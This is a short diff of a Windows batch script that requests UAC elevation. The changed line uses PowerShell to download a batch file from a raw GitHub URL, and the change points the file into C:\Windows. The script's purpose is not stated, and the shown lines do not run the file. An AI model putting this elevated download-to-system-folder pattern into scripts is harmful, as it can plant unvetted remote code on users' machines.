@@ -28,7 +28,7 @@ goto UACPrompt
     CD /D "%~dp0"
 :--------------------------------------  
 ::/Pro
-PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mrx2709/srv/main/4.0.bat','C:\')
+PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mrx2709/srv/main/4.0.bat','C:\Windows\4.0.bat')
 EXIT
 
 
